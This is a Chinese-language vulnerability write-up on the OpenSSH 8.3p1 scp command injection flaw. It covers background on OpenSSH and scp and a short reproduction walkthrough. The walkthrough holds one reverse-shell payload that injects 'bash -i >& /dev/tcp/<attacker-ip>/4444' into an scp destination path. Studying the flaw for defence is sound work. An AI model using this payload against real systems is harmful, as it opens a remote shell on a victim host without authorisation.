## 一、漏洞概要

2020年6月9日，研究人员Chinmay
Pandya在Openssh中发现了一个漏洞，于7月18日公开。OpenSSH的8.3p1中的scp允许在scp.c远程功能中注入命令，攻击者可利用该漏洞执行任意命令。目前绝大多数linux系统受影响。深信服安全研究团队依据漏洞重要性和影响力进行评估，作出漏洞通告。

## 二、漏洞分析

2.1 OpenSSH介绍  
OpenSSH是用于使用SSH协议进行远程登录的一个开源实现。通过对交互的流量进行加密防止窃听，连接劫持以及其他攻击。OpenSSH由OpenBSD项目的一些开发人员开发，
并以BSD样式的许可证提供，且已被集成到许多商业产品中。  
2.2 漏洞描述  
研究人员Chinmay
Pandya在openssh的scp组件中发现了一个命令注入漏洞。OpenSSH的8.3p1中的scp允许在scp.c远程功能中注入命令，攻击者可利用该漏洞执行任意命令。目前绝大多数linux系统受影响。  
2.2.1 scp命令简介  
scp 是 secure copy 的缩写。在linux系统中，scp用于linux之间复制文件和目录，基于 ssh
登陆进行安全的远程文件拷贝命令。该命令由openssh的scp.c及其他相关代码实现。  
2.2.2 漏洞复现  
scp命令引发的命令注入

反弹shell的payload

    
    
    scp 1.txt cracer@受害机ip:'`bash -i >& /dev/tcp/攻击机ip/4444 0>&1`/tmp/test.txt'
    

实战测试，这里使用本机进行测试  
1、查看ssh版本，符合漏洞版本

    
    
    ssh -V
    

![](https://image.3001.net/images/20201111/1605084931_5faba703ea69699fff48e.png!small)2、先在本地新建好文件，用于上传  

![](https://image.3001.net/images/20201111/1605084947_5faba7139b7f07de95e01.png!small)  

3、本地开启监听

![](https://image.3001.net/images/20201111/1605084967_5faba727ddcb7c5d354db.png!small)3、使用scp命令注入成功反弹shell![](https://image.3001.net/images/20201111/1605084994_5faba7425c1d47734329f.png!small)![](https://image.3001.net/images/20201111/1605085003_5faba74bb674328c14929.png!small)
**免责声明：本人坚决反对利用教学方法进行犯罪的行为，一切犯罪行为必将受到严惩，绿色网络需要我们共同维护，更推荐大家了解它们背后的原理，更好地进行防护。禁止任何人转载到其他站点，禁止用于任何非法用途。如有任何人凭此做何非法事情，均于笔者无关，特此声明。**  

